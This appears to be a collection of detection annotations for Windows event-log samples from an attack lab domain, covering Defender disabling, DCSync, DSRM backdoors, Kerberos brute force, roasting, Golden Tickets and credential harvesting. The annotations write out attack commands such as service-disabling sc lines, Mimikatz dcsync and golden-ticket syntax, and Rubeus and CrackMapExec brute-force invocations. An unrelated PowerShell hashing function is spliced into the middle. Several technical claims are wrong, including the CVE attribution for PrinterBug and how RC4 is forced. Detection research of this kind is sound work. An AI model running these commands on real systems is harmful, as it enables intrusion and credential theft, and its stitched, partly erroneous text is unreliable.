Why GPO DACL changes matter: once an attacker has GenericWrite/GPLink-edit on a GPO, they can push immediate-task scheduled tasks, startup scripts, file deployments, and registry edits to every host the GPO applies to — at the next gpupdate (every 90 minutes by default) the change runs. BloodHound `GenericWrite/WriteDACL/GpLink` outbound-ACL edges find these paths.

Companion to file `ID5136-4662 sensitive GPO edited.evtx`: that one captures the GPO CONTENTS change; this one is the GPO ACL change (the prep step that ENABLES the contents change to occur stealthily later).

Event 5143 (network share permissions modified): admmig modifies the DACL/SDDL on `hidden-share$` (the share published in companion file `ID5142- New file share created.evtx`). T1135 + T1098 — share-DACL editing is the next step after share creation: granting Everyone or Anonymous Read/Write access turns the share into an open exfil/drop endpoint.
Event 5145 (×3): the modified-DACL share is then accessed from 10.23.23.9 — confirming the DACL change took effect (the read/write would have failed pre-change if the DACL was restrictive).
Pairing pattern: 5142 (publish) → 5143 (loosen ACL) → 5145 (exploit) — the canonical 3-step share-weaponization fingerprint. Each step alone has weak signal; together they're high-confidence.

Backing path `Users\admmig\Desktop` indicates the attacker is using the admmig profile as both the workspace AND the published share root — files dropped to Desktop are immediately readable across the network from any host that can reach 10.23.23.9 → hidden-share$.

12 × Sysmon Event 12 + 13 × Event 13 (RuleName=T1553.003 SIP and Trust Provider Hijacking) on host WIN by user WIN\Admin: regsvr32.exe registered a custom Subject Interface Package (SIP) provider under GUID `{E59B6E68-3312-4738-961F-DB9405B2DDCB}` for every code-signing operation Windows uses (PutSignedDataMsg / GetSignedDataMsg / RemoveSignedDataMsg / CreateIndirectData / VerifyIndirectData / IsMyFileType2). Each operation gets its own `\Dll` and `\FuncName` value, redirecting cryptographic-signature checks into the attacker's DLL. Net effect: the OS will accept malicious binaries as signed-and-trusted, defeating Authenticode validation across the system.

Ambient: Background Activity Monitor (`HKLM\...\bam\UserSettings\<SID>\\Device\...regsvr32.exe`) recorded the regsvr32 launch — this is normal Windows accounting, not part of the attack, but it confirms the regsvr32 invocation timing under the WIN\Admin SID.

malicious_events: Event 4688: `powershell.exe -command "Set-MpPreference -EnableControlledFolderAccess Disabled"` invoked by admmig — disables Microsoft Defender's Controlled Folder Access (the ransomware-protection feature that prevents unauthorized writes to user-document folders). T1562.001 Disable or Modify Tools.

Event 4688: WIN10-02$ (the host machine account context) running `wevtutil.exe install-manifest C:\Windows\TEMP\<UUID>.man` and `uninstall-manifest <same>` — registers and unregisters a Windows Event Log channel manifest from a file in TEMP. This is a Defender-tampering primitive: by registering then immediately unregistering a channel, the attacker can manipulate which event channels exist before specific Defender events would be emitted, blinding parts of the AV's logging.
Event 4688 of `wmiprvse.exe -secured -Embedding` — confirms remote WMI activation drove the changes (admmig connected via WMI, didn't sit at the console).
Combined: T1562.001 Disable Tools (Defender CFA) + audit-channel manipulation.
3 × Event 4688 of `sc.exe config <service> start= disabled` invoked by admmig — disables the auto-start for three Defender-related services in sequence:
- `sc config sense start= disabled` (Microsoft Defender for Endpoint EDR sensor)
- `sc config mpssvc start= disabled` (Windows Defender Firewall service)
- `sc config WinDefend start= disabled` (Windows Defender Antivirus core service)

After next reboot, all three are off — the host has no AV, no firewall, and no EDR telemetry. T1562.001 Disable or Modify Tools (Defender) + T1562.004 Disable Firewall combined into one cleanup. WIN10-02$ machine-account context confirms remote WMI delivery.
Note: `sc config` only changes the start type, not the running state — the attacker either pairs with `sc stop` or just waits for next reboot.

Event 5007 (×4): Windows Defender configuration was changed — this is the SECURITY-channel record of Defender registry-policy edits (HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions, ...\Exclusions\Paths, ...\Exclusions\Processes, ...\Exclusions\Extensions, ...\Exclusions\IpAddresses).

T1562.001 Disable or Modify Tools: each 5007 corresponds to one Defender Exclusion-list write — adding a path/process/extension that Defender will never scan. Combined, the 4 events likely represent excluding a directory tree + a payload binary + an extension (.tmp/.bin) + an attacker IP from real-time scanning.

Companion to file `ID4688-Defender critical features disabled (command).evtx` and `ID800-4103-4104 Defender exclusion added (PowerShell).evtx`: those capture the user-mode command (Set-MpPreference / Add-MpPreference) that drives the 5007 — this entry is the policy-change confirmation.

5007 events on Defender ARE the high-fidelity signal — direct registry edits to Defender's policy keys are blocked except via the official surfaces, and the 5007 fires only for sanctioned paths. Anomalous in production: legitimate Defender exclusion adds should be GPO-driven and infrequent.

Event 4756 (×3, member added to security-enabled universal group): admmig adds `admin-hacker` to the THREE most dangerous Exchange-installed groups — `Exchange Servers`, `Exchange Trusted Subsystem`, `Exchange Windows Permissions`. T1003.006 OS Credential Dumping: DCSync — these groups carry DS-Replication-Get-Changes-All / WriteDACL on the domain head.

`Exchange Windows Permissions` has WriteDACL on the domain object itself — an account in this group can grant ITSELF the DS-Replication-Get-Changes / DS-Replication-Get-Changes-All extended rights, then run Mimikatz `lsadump::dcsync /all /csv` to pull every NT hash in the forest including krbtgt → Golden Ticket. This is the well-known PrivExchange / CVE-2018-8581 escalation path. (Mimikatz subcommand syntax — analyst shorthand for the technique; not literally logged).
`Exchange Trusted Subsystem` is granted WriteAccessProperties on user objects domain-wide — meaning members can reset arbitrary user passwords (T1098 reset-everyone primitive).
Bulk add to all three in one 4756 sequence is the smoking gun: the attacker is staging the DCSync chain end-to-end via Exchange ACL inheritance.

Companion to file `ID4756-Exchange admin group change.evtx`: that one targets Exchange ROLE groups (Organization Management etc.); this one targets the Exchange SERVICE groups that carry the actual replication/DACL rights.

Event 4794 (Directory Services Restore Mode admin password set): admmig sets the DSRM (Directory Services Restore Mode) administrator password on a Domain Controller. T1556 Modify Authentication Process / T1098 Account Manipulation: DSRM is the local-Administrator account that exists ON the DC's local SAM (separate from domain-side AD). Setting its password is a high-value persistence primitive.

Event 4688: `ntdsutil` invocation — the Microsoft-signed AD utility used to set the DSRM password (`set dsrm password / sync from domain account <user> / q / q`). Combined, the 4688+4794 pair is the smoking gun for DSRM-credential persistence.

Why DSRM matters: when the DC is rebooted into DSRM mode (or when DsrmAdminLogonBehavior registry key is set to 2), the DSRM admin password authenticates AGAINST THE DC ITSELF — bypassing all domain authentication. Mimikatz `lsadump::lsa /inject` can reveal the DSRM hash; `lsadump::dsrm /backup` extracts it; pass-the-hash with the DSRM hash works for local-DC logon. (Mimikatz subcommand syntax — analyst shorthand for the technique; not literally logged).
DsrmAdminLogonBehavior=2 setting (which makes DSRM usable in normal operations, not just safe-mode boot) combined with a known DSRM password is a hidden Domain-Controller backdoor.

Note crucial difference vs. file 63: payload says `Failed password for admmig` (no `invalid user` prefix) — confirming `admmig` IS a real account on this host. T1110.001 Password Guessing against a known-valid user is more dangerous than the random-username variant because each attempt is a real chance at success.

5 × Event 4625 + 5 × Event 4776 (NTLM credential validation) on FS01: SSH-driven brute force against non-existent usernames. The privileged sshd_5848 / FS01$ accounts spawning the auth attempts indicate `sshd.exe -R / -y` (the OpenSSH-Win64 logon-helper subprocess pattern).
Events 4717/4718: User Right Assigned/Removed on local accounts — happens when sshd manages logon rights for new sessions.
Event 4624 (LogonType 5 = Service): SYSTEM-context logons by sshd.
Event 4672: SeDebugPrivilege / SeBackupPrivilege etc. assigned (sshd needs them for impersonation).

Event 1102 (Security log cleared) after the bursts — anti-forensics finalization. Combined with files 63/64/65/70/71, this is the full SSH-backdoor lifecycle: install → activate → bind → bruteforce. T1110.001 + T1133 chain.

5 × Event 4625 against valid users on FS01 — TargetUserName includes both raw `admmig` (NTLM via Negotiate) and `admmig@offsec.lan` (Kerberos UPN). The mix of LogonType 3 (network) + LogonType 5 (service) + LogonType 8 (NetworkCleartext, sshd password-mode) confirms the failures came through OpenSSH-Win64 sshd. Companion to file 78 (non-existent variant) and the SSH backdoor chain — T1110.001 Password Guessing against valid AD accounts is the higher-risk variant because each guess is a real chance at access.

Event 4768 / 4771 (×52): rapid Kerberos AS-REQ stream from `::ffff:10.23.123.11` and `::ffff:10.23.42.16` against ~50 mostly-random gibberish usernames (`g`, `go`, `ar`, `xc`, `xt`, `b aer`, `sgfg`, `gsdf`, `dyfgdhbn`...) plus a smattering of real-ish probes (`administrator`, `admin-test`, `admin-hacker`, `test1`, `test2`).

T1110.003 Password Spraying / T1110.004 Credential Stuffing — but specifically the `Kerbrute brute` / `Kerbrute passwordspray` mode that tests username:password pairs via AS-REQ. Each non-existent user causes a 4768 fail or a 4771 with status `0x6` (KDC_ERR_C_PRINCIPAL_UNKNOWN); each valid user with bad password gets `0x18` (KDC_ERR_PREAUTH_FAILED).

The mix of real and gibberish usernames is the SIGNATURE of dictionary-driven Kerberos enumeration — the attacker is feeding a wordlist; most entries don't correspond to real accounts so they fail with 0x6, and the few that DO exist (admmig, administrator, HealthMailboxf49e2c8) get the more interesting 0x18 response that confirms the username is valid in the domain.
Two source IPs (10.23.123.11 + 10.23.42.16) suggests either two campaigns or one campaign distributed across two attacker hosts to evade per-source-IP rate-limiting / lockout windows.
krbtgt/OFFSEC.LAN as the ServiceName confirms these are TGT-request (AS-REQ) phase events, not service-ticket-request (TGS-REQ) — the brute-force is at the initial authentication step.

Event 4768 / 4771 (×42): Kerberos AS-REQ stream from `::ffff:10.23.123.11` against the COMPLETE set of REAL accounts in the domain (Administrator, Guest, DefaultAccount, krbtgt, dsrm, admmig, hack1, hacker2, all HealthMailbox* monitoring accounts, all SM_* mailboxes, svc-ata, svc_adfs01, svc_nxlog, Svc-SQL-DB01, vuln_scan, etc.) — total user-coverage equals the entire `Get-ADUser -Filter *` result. (cmdlet attribution — inferential; the cmdlet name itself is not always logged).

T1087.002 Account Discovery: Domain Account / T1110 Brute Force — but specifically the `Kerbrute userenum` mode: send AS-REQ for every name in a list and watch which ones return KDC_ERR_PREAUTH_REQUIRED (`0x19` — username valid, password not provided) vs KDC_ERR_C_PRINCIPAL_UNKNOWN (`0x6` — username invalid). The 0x19/0x6 binary tells the attacker exactly which usernames exist without making any auth attempt. (tool-family attribution — inferential from the event fingerprint).

The mix of real names + the absence of obvious gibberish probes (unlike file `ID4768-4771-Kerberos brutforce with non existing users.evtx`) is the signature of the ENUMERATION mode — the attacker is checking a curated list (probably pulled from an earlier LDAP-anonymous bind or BloodHound dump) for which accounts the KDC will respond to.

`$P51000-50I28MP5JB3E` is a kerbrute internal probe / cookie name; HealthMailbox* and SM_* are Exchange synthetic accounts that almost no manual admin would query, but Kerbrute does because they're enumerable.

krbtgt as a TARGET (Account Name in the 4768) is the kerbrute fingerprint — krbtgt itself gets probed with the same dictionary because it's a real account; if the response is 0x19 the attacker has confirmed the krbtgt account exists (always true) AND that the KDC is responsive to anonymous probes.

Event 4771 (×54): Kerberos pre-authentication FAIL events on a SINGLE valid account (`admin-hacker`) from `::ffff:10.23.123.11` — 54 password attempts in rapid succession. T1110.001 Brute Force: Password Guessing.

FailureCode for these events is `0x18` (KDC_ERR_PREAUTH_FAILED) — confirms the username is correct but the supplied password failed pre-auth decryption against the account's NT hash. This is the canonical online password-spray/brute IoC.

54 attempts on one account from one source within seconds is well above any human-typo threshold — automated brute via tools like `Rubeus brute`, `Hydra -f -m kerberos`, or `cme smb -d offsec.lan -u admin-hacker -p passwords.txt`. (illustrative tool invocations — example syntax, not literally in the events).

ServiceName=`krbtgt/OFFSEC.LAN` — the brute is at the AS-REQ (TGT-request) phase against the KDC service principal. If the account had DONT_REQUIRE_PREAUTH set this would have been an AS-REP roast instead; with normal pre-auth in place the attacker is forced into an online brute (which is what 4771 records).

Without a domain lockout policy that catches this density of failures within a small window, eventually one of the 54 attempts may succeed. The expected response is a domain-wide 4740 (Account Lockout) on admin-hacker — its absence here means the attacker is staying just below the lockout threshold or the threshold is too lax.

57 × Event 4662 with diverse subjects across 5 machine accounts (WSUS01$, FS03VULN$, ROOTDC1$, ROOTDC2$) plus `admmig` — wide-scope read of DPAPI-related AD attributes. The DPAPI master key is sealed with a domain-controller-known secret (the krbtgt-derived BackupKey); accessing the related schema GUIDs across multiple host machine accounts is the fingerprint of `dpapi::masterkey /backupkey` / `dpapi::credhist` enumeration via Mimikatz. T1555.005 DPAPI Stored Credentials harvest — let the attacker decrypt every user's saved browser passwords / IE creds / RDP saved creds without each user needing to be online. (Mimikatz subcommand syntax — analyst shorthand for the technique; not literally logged).

Event 5145 (×349, network share access): admmig systematically reads, over SMB, every credential storage location across both Administrator and admmig profiles — DPAPI vaults (`Vault\AC658CB4...` master-key storage), Microsoft Credentials (`Microsoft\Credentials\<bytes>` blobs), DPAPI Master Keys (`Microsoft\Protect\<SID>\<key-GUID>`), Chrome Login Data, mRemoteNG saved profiles, RDCMan saved settings, Firefox/Cyberfox/IceDragon/K-Meleon/icecat/BlackHawk profiles.ini (browser-cred profile bootstrap), UltraVNC ultravnc.ini (saved RDP-equivalent passwords), Wlansvc Wi-Fi profile XMLs.

T1555 Credentials from Password Stores + T1539 Steal Web Session Cookie + T1003.005 OS Credential Dumping: Cached Domain Credentials. This is the LSASSY / DonPapi / DonPAPI signature: a credential-harvest tool that walks every known credential-storage path on a remote host over SMB and reads them in one pass.

349 5145 events from a single source admmig session — automated tooling, not interactive admin work. The completeness of the path list (every browser, every Microsoft cred store, every SaaS-RDP-manager) is the smoking gun.

Companion paths `SYSTEM32\AqdQWnLE.tmp` and `SYSTEM32\oyCCGQai.tmp` are random 8-char .tmp output files — the LSASSY signature for staged Mimikatz/secretsdump output before exfil. The svcctl + srvsvc IPC$ pipe accesses are how the credential collector invokes its service+share-enum sub-routines.

After 349 5145s, the harvested credentials feed offline crack (Chrome Login Data SQLite + DPAPI master key → cleartext) or pass-the-hash / pass-the-ticket follow-on lateral movement against any password reuse.

Event 5145 (×, share access on IPC$ for the named pipe `spoolss`): admmig accesses the Windows Print Spooler RPC binding from 10.23.123.11 / 10.23.23.9. T1187 Forced Authentication via PrinterBug / SpoolSample / PetitPotam / DFSCoerce family.

How PrinterBug (CVE-2021-1675/-34527 PrintNightmare lineage) works: an unauthenticated attacker calls `RpcRemoteFindFirstPrinterChangeNotificationEx` on the target's spoolss pipe with an attacker-controlled UNC; the target's Spooler service then authenticates outbound to that UNC using the host's MACHINE ACCOUNT credentials. Combined with NTLM-relay tooling (ntlmrelayx.py), this turns into a 1-click coerced authentication primitive that lets the attacker authenticate AS the victim machine to LDAP/AD CS — giving them DC privileges if the victim is a DC.

Event 4624 (×, network logon via Kerberos/NTLM): the COERCED outbound authentication landing where the attacker had set up an NTLM relay listener — confirming the spoolss trigger fired and the victim's machine account authenticated where instructed.
Both source IPs (10.23.123.11 + 10.23.23.9) suggest a two-stage chain: 10.23.123.11 issues the RPC that triggers the coerce, 10.23.23.9 is the relay endpoint receiving the coerced auth.

Mitigation: disable the Print Spooler service on Domain Controllers entirely (it should not run on a DC), patch CVE-2021-1675/-34527, enforce LDAP signing + EPA. Detection: 5145 with RelativeTargetName=`spoolss` from a non-print-server source is a strong IoC.

10 × Event 4624 (LogonType 3 Network, AuthPkg=Kerberos, LogonProcess=Kerberos) from IpAddress 10.23.23.9. TargetUserName values include both `admmig` AND `not_existing_user` — successful Kerberos network logons for a username that DOESN'T EXIST in the directory is the smoking-gun Golden Ticket (T1558.001) signature: a TGT forged with the krbtgt hash will validate against ANY account name because the DC trusts the krbtgt-signed PAC without re-checking AD.

Mimikatz `kerberos::golden /user:not_existing_user /domain:offsec.lan /sid:... /krbtgt:<hash> /ptt` is the typical creation flow; the resulting TGT then drives `klist` / `dir \\dc\share` operations that show up as these 4624 events.

Event 4768 (TGT issued) + Event 4769 (TGS issued) for TargetUserName=`rootdc1` (NO trailing `$`) at ::ffff:10.23.123.11 — but ROOTDC1 is a domain-controller computer account, whose canonical SAM name MUST end in `$` (machine-account naming convention). Tickets with TargetUserName=`rootdc1` (sans $) cannot match the SAM record under normal conditions.

T1558 Steal or Forge Kerberos Tickets + CVE-2021-42278/42287 (noPac / sAMAccountName spoofing): the attacker temporarily renamed the machine account to lose its trailing `$`, then requested a TGT — the KDC issues the TGT under the renamed identity, and at follow-on TGS-REQ time the resulting service ticket carries DC-equivalent privileges because the PAC was minted against a DC machine account.

After the ticket is harvested the attacker renames the account BACK to `rootdc1$` to scrub the noPac evidence. The single-letter-of-difference between TargetUserName=`rootdc1` (4768) and the actual machine name is the IoC.
Companion to file `ID4781-Computer account renamed without a trailing $ (CVE-2021-42278).evtx`: that one captures the SAM rename event; this one captures the TGT/TGS issuance under the renamed name.

Event 4768 (Kerberos TGT requested) for TargetUserName=`admin-test` from `::ffff:10.23.23.9`. The signature of an AS-REP Roast attack is a 4768 with PreAuthType=`0` (no pre-authentication required) — this only fires for accounts that have UAC bit `DONT_REQUIRE_PREAUTH` set, which is enumerable via LDAP / Get-DomainUser -PreauthNotRequired.

T1558.004 Steal or Forge Kerberos Tickets: AS-REP Roasting — attacker requests an AS-REP for a DONT_REQUIRE_PREAUTH-flagged account; the response is encrypted with the account's NT hash. Tools: `Rubeus asreproast`, Impacket `GetNPUsers.py -no-pass`. Output is hashcat mode 18200 — typical NT hash crack with a wordlist takes minutes for weak passwords. (illustrative tool invocation — Impacket example syntax, not literally in the events).

`admin-test` is an attacker-named honeypot/canary subject in this lab — its DONT_REQUIRE_PREAUTH flag is also intentionally set (see file `ID4738-Do not require Kerberos preauthentication.evtx` for the prep stage where this flag was flipped on `hack1`).
Detection: any 4768 with PreAuthType=0 should be considered a TripWire alert — DONT_REQUIRE_PREAUTH has effectively no legitimate use case in modern AD.

Event 4769 (Kerberos TGS issued) for TargetUserName=`gold-non-existing-user@offsec.lan` — a USERNAME THAT DOES NOT EXIST in AD. The KDC issued a service ticket because it accepted a forged TGT signed with the krbtgt secret. T1558.001 Forge Kerberos Tickets: Golden Ticket — the smoking-gun signature.

Mimikatz `kerberos::golden /user:gold-non-existing-user /domain:offsec.lan /sid:S-1-5-21-... /krbtgt:<NT-hash> /id:500 /ptt` creates the forged TGT; the resulting `dir \\rootdc1\c$` or similar SMB call against multiple servers (FS02, MSSQL01, ROOTDC1, ROOTDC2) drives the 4769 events — one per target host.

The 4769s also show ServiceName values for DC machine accounts (ROOTDC1$@OFFSEC.LAN) — confirming the forged ticket was used to access DC-tier services across multiple machine accounts in one session, which is characteristic of post-Golden-Ticket reconnaissance.

Source IP `::1` (loopback) appears alongside `::ffff:10.23.23.9` — indicating the Golden Ticket was driven from a host that connected to its own KDC service for ticket generation (ptt mode local consumption) AND then pivoted out via the network IP for follow-on lateral movement.

Event 4769 (Kerberos service ticket requested) for `Svc-SQL-DB01` (a service account with a SPN) by admmig — TicketEncryptionType=`0x17` (RC4-HMAC, the LM-OWF-equivalent legacy type) instead of the modern AES-256 (`0x12`).

T1558.003 Kerberoasting: when the service account supports AES (msDS-SupportedEncryptionTypes includes AES bit), the KDC normally returns AES. Attackers force RC4 by setting EncryptionType in the AS-REQ to `0x17` only — RC4-encrypted TGS-REPs are MUCH faster to crack offline (hashcat mode 13100 vs 19700).
The companion 4769s for ROOTDC1$ and WEC01$ (machine accounts with SPNs that the attacker enumerated) are also RC4-encrypted — confirming the deliberate downgrade.

Three source IPs (::1 loopback, 10.23.23.9, 10.23.42.22) suggest the kerberoast was driven from multiple positions — likely Rubeus run from each host as the attacker pivoted, all dumping to the same hashcat .txt file.
Mimikatz `kerberos::ask /target:MSSQLSvc/...` and `Rubeus kerberoast /rc4opsec /outfile:hashes.txt` both produce this exact 4769 fingerprint.

malicious_events: Event 6004 (×3, Microsoft-Windows-DNS-Server: failed zone transfer): three failed AXFR (full zone transfer) attempts against the DNS Server. T1018 Remote System Discovery / T1590 Gather Victim Network Information: an attacker probing the DNS server for unauthenticated/anonymous zone transfers.

AXFR returns the COMPLETE list of every name → IP mapping in the zone, including all internal hostnames. Successful AXFR = adversary gets the full internal network map without scanning. Modern DNS servers restrict AXFR to known secondary servers (per-IP allowlist), so failed AXFRs from a non-allowlisted source are the IoC.

Three successive failed transfers from the same source suggests the attacker is methodically trying different zone names (offsec.lan, _msdcs.offsec.lan, ROOTBLUE.LAN trust-target zone, etc.) — each fails because the source isn't on the AXFR allowlist, but the attempt itself is a strong recon-stage tell.
Common tools: `dig @target offsec.lan AXFR`, `nslookup -q=AXFR offsec.lan target`, `dnsrecon -d offsec.lan -t axfr`. All produce 6004 trails on the target DNS server.

function Get-FileHash
{
    [CmdletBinding(DefaultParameterSetName = "Path")]
    param(
        [Parameter(Mandatory, ParameterSetName="Path", Position = 0)]
        [System.String[]]
        $Path,

        [Parameter(Mandatory, ParameterSetName="LiteralPath", ValueFromPipelineByPropertyName = $true)]
        [Alias("PSPath")]
        [System.String[]]
        $LiteralPath,
        
        [Parameter(Mandatory, ParameterSetName="Stream")]
        [System.IO.Stream]
        $InputStream,

        [ValidateSet("SHA1", "SHA256", "SHA384", "SHA512", "MACTripleDES", "MD5", "RIPEMD160")]
        [System.String]
        $Algorithm="SHA256"
    )
    
    begin
    {
        # Construct the strongly-typed crypto object
        $hasher = [System.Security.Cryptography.HashAlgorithm]::Create($Algorithm)
    }
    
    process
    {
        if($PSCmdlet.ParameterSetName -eq "Stream")
        {
            GetStreamHash -InputStream $InputStream -RelatedPath $null -Hasher $hasher
        }
        else
        {
            $pathsToProcess = @()
            if($PSCmdlet.ParameterSetName  -eq "LiteralPath")
            {
                $pathsToProcess += Resolve-Path -LiteralPath $LiteralPath | Foreach-Object ProviderPath
            }
            if($PSCmdlet.ParameterSetName -eq "Path")
            {
                $pathsToProcess += Resolve-Path $Path | Foreach-Object ProviderPath
            }

            foreach($filePath in $pathsToProcess)
            {
                if(Test-Path -LiteralPath $filePath -PathType Container)
                {
                    continue
                }

                try
                {
                    # Read the file specified in $FilePath as a Byte array
                    [system.io.stream]$stream = [system.io.file]::OpenRead($filePath)
                    GetStreamHash -InputStream $stream  -RelatedPath $filePath -Hasher $hasher
                }
                catch [Exception]
                {
                    $errorMessage = [Microsoft.PowerShell.Commands.UtilityResources]::FileReadError -f $FilePath, $_
                    Write-Error -Message $errorMessage -Category ReadError -ErrorId "FileReadError" -TargetObject $FilePath
                    return
                }
                finally
                {
                    if($stream)
                    {
                        $stream.Close()
                    }
                }                            
            }
        }
    }
}

function GetStreamHash
{
    param(
        [System.IO.Stream]
        $InputStream,

        [System.String]
        $RelatedPath,

        [System.Security.Cryptography.HashAlgorithm]
        $Hasher)

    # Compute file-hash using the crypto object
    [Byte[]] $computedHash = $Hasher.ComputeHash($InputStream)
    [string] $hash = [BitConverter]::ToString($computedHash) -replace '-',''

    if ($RelatedPath -eq $null)
    {
        $retVal = [PSCustomObject] @{
            Algorithm = $Algorithm.ToUpperInvariant()
            Hash = $hash
        }
        $retVal.psobject.TypeNames.Insert(0, "Microsoft.Powershell.Utility.FileHash")
        $retVal
    }
    else
    {
        $retVal = [PSCustomObject] @{
            Algorithm = $Algorithm.ToUpperInvariant()
            Hash = $hash
            Path = $RelatedPath
        }
        $retVal.psobject.TypeNames.Insert(0, "Microsoft.Powershell.Utility.FileHash")
        $retVal

    }
}

malicious_events: Event 4104 (ScriptBlock logging): Get-NetFirewallProfile / Get-NetFirewallRule / Show-NetFirewallRule pipeline enumerating Windows Firewall configuration. T1518.001 Security Software Discovery via the PowerShell management module (NetSecurity).

Companion to file 127 (`ID4688-Firewall configuration enumerated (command).evtx`) which captures the netsh advfirewall LOLBin variant. PS variant blends with sanctioned admin tooling because Get-NetFirewallProfile is the official cmdlet.

Detection: 4104 referencing NetSecurity module cmdlets from a non-admin user account (or from an interactive shell at unusual hours) is the IoC. Firewall enumeration is rarely user-driven; it's typically GPO/SCCM-driven.

Event 5145 (×6, share access check): admmig from `10.23.23.9` traverses C$ \Windows\System32\Drivers\etc and accesses the `hosts` file (specifically `hosts:Zone.Identifier` — the Mark-of-the-Web alternate data stream).

T1565.001 Stored Data Manipulation: the Windows hosts file (`%windir%\System32\drivers\etc\hosts`) overrides DNS for entries in it. Editing it remotely lets the attacker redirect DNS lookups for the target host without touching the DNS server — useful for: (a) hijacking software-update-channel domains to attacker-controlled IPs (Windows Update, Microsoft Defender update endpoint, third-party update servers); (b) creating internal-only spoofing for SMB-relay where the attacker wants `dc01.offsec.lan` to resolve to their own IP for the duration of the relay; (c) silently breaking specific defensive endpoints (telemetry hosts) without leaving DNS-server logs.

Accessing `:Zone.Identifier` is the IoC: this ADS is what marks downloaded files as 'Internet Zone' for SmartScreen/Defender. Reading it confirms the attacker was specifically interested in the download-flag state — typical of pre-edit reconnaissance OR of removing the MotW marker after the file is staged.

Path traversal in the share-access events progresses from `\` → `Windows\System32` → `WINDOWS\SYSTEM32\DRIVERS` → `WINDOWS\SYSTEM32\DRIVERS\ETC` → `hosts:Zone.Identifier` — the manual cd pattern of a tool like smbclient.py or Sysinternals net use + dir.

15 × Event 4624 from 10.23.123.11 with TargetUserName=`ANONYMOUS LOGON` paired with subject `admmig` — DonPapi (Impacket-based credential-harvester) signature: it issues anonymous-login probes WITH a domain name specified, which is unusual (real anonymous logons don't carry a domain). Each event represents an SMB/RPC NULL-session probe used by DonPapi to enumerate DPAPI vault data, recent docs, and saved RDP creds across the host. T1110.004 Credential Stuffing prep / T1135 Network Share Discovery.

50 × Event 4661 + 4 × Event 4662 on ROOTDC1 by admmig: lsass.exe handle requests against well-known builtin RIDs `S-1-5-32-544` (Administrators), `-548` (Account Operators), `-557` (Builtin/Pre-Windows 2000), `-560` (Windows Authorization Access Group), `-569` (Cryptographic Operators), `-578` (Hyper-V Administrators), and others — RID brute-force enumeration of every local group via SAMRPC (LookupSidByName / EnumerateAliases). CrackMapExec's `--local-groups` and `--users` modules issue this exact pattern. T1087.001 Local Account Discovery + T1069.001 Local Group Discovery. Distinct from the file-85 SAM dump because this enumerates GROUP membership rather than reading per-user password hashes.

24 × Event 4661 by admmig via lsass.exe accessing high-value SAM/AD identifiers including S-1-5-21-...-512 (Domain Admins RID 512), -513 (Domain Users 513), -1111 (admmig's own SID), `CN=Builtin,DC=offsec,DC=lan`, and `CN=Server,CN=System,DC=offsec,DC=lan`. T1087.002 Domain Account Discovery + T1069.002 Domain Group Discovery: the focus on Domain Admins (512) is the signature of `Get-DomainGroup -Identity 'Domain Admins' -Members` / `net group 'Domain Admins' /domain` / CrackMapExec `--groups` reconnaissance.

80 × Event 4662 (Object Access in AD) by admmig touching ~80 unique AD schema GUIDs in registry — wide-spectrum group/object attribute enumeration via LDAP. The breadth of distinct GUIDs (no concentration on a few attribute classes) is the CrackMapExec `--groups` / `--users` / `--rid-brute` enumeration footprint: it iterates through the entire AD schema reading attribute definitions to map domain groups and their members. T1069.002 Domain Group Discovery + T1087.002 Domain Account Discovery. The presence of 80 events with no other supporting events (no logons, no process spawns) means this was driven by an already-authenticated LDAP session — enumeration phase only.

Event 4688: `net group /domain` (which net.exe internally re-launches as `net1 group /domain`) — admmig enumerates every Domain group from any domain-joined host. T1069.002 Domain Group Discovery via the LOLBin net.exe; the dual net.exe→net1.exe spawn is the canonical Windows pattern (net.exe is a 16-bit-era stub that calls the real worker net1.exe).
Event 1102 (Security log cleared) finalizer indicates the discovery output was scrubbed to hide which groups were targeted.

malicious_events: Among 240 PowerShell ScriptBlock/Pipeline events, the dispositive line is `Start-Service sshd` — manual activation of the OpenSSH server (T1133 External Remote Services / T1505 Server Software Component). The other ~239 events are PowerShell module-export ceremony (NetSecurity / NetFirewall cmdlet definitions) loaded as part of the Set-NetFirewallRule / Get-NetFirewallProfile dependencies — high noise floor. Pairs with file 65 (sshd listening on 0.0.0.0:22 / :::22) and files 63-64 (subsequent SSH brute-force) for the full backdoor-install timeline.

label_review.reason: In-artifact intent audit 2026-06-12: slice shows admmig running 'Start-Service sshd', 'Set-Service -Name sshd -StartupType Automatic', and 'Get-NetFirewallRule -Name *ssh*'; the remaining ~100 4104s are auto-generated NetSecurity cmdletization noise. Enabling a signed Windows feature with no backdoor config is routine admin in-artifact. Provenance-only maliciousness. Relabeled benign.

malicious_events: Event 4624 LogonType 9 (NewCredentials, AuthPkg=Negotiate, LogonProcess=seclogo) for `admmig` from 10.23.23.9 — LogonType 9 + LogonProcess `seclogo` is the canonical Pass-the-Hash fingerprint via Mimikatz `sekurlsa::pth` or runas /netonly. The hash provider creates a session that uses the cached hash for outbound auth without re-prompting. (Mimikatz subcommand syntax — analyst shorthand for the technique; not literally logged).
Event 4672: SeDebugPrivilege etc. assigned to the new logon — privileged token attached to the PtH session.
2 × Event 4688: cmd.exe + conhost.exe spawned by the new logon — attacker now operating as `admmig` in their own session.
2 × Event 5145: SMB share access from the host to `\\*\C$` (loopback admin-share probe) — confirms the PtH session can reach SMB resources network-wide.
Event 1102 (Security log cleared) at end — anti-forensics finalization (T1070.001).
Event 4964 (Login of a member of a special group): admmig joined a Special Logon Group, often DAs / Backup Operators.

Event 12 (Sysmon RegistryEvent CreateKey, RuleName tags T1076 Remote Desktop Protocol): reg.exe created HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services on FS03.offsec.lan. This policy key is the parent for `Shadow` (RDP shadow session) settings — a follow-up SetValue on `Shadow=2` would allow an attacker to silently spy on, or take over, an active interactive RDP session without the user's consent. Filename mentions ID13 but the actual event is Sysmon ID 12 (CreateKey, not SetValue) — the SetValue would arrive in a subsequent event 13. (T1021.001 Remote Services: RDP / T1563.002 Session Hijacking via RDP Shadowing)

Event 5600 (×10, WinHTTP: proxy configuration changed): the system-wide WinHTTP proxy settings are modified ten times in succession. T1090 Proxy: Internal Proxy / T1071.001 Application Layer Protocol: Web Protocols.

Why WinHTTP proxy matters: WinHTTP is the HTTP stack used by SYSTEM-context services (BITS, WSUS, Defender, AD CS Web Enrollment). Setting an attacker-controlled proxy redirects all SYSTEM-tier outbound HTTP through the attacker host — letting them: (a) MITM Windows Update / Defender update channels (push fake signatures, prevent malware-detection update), (b) inject fake AD CS Web-Enrollment responses, (c) capture system-level credentials sent during automatic SSO.

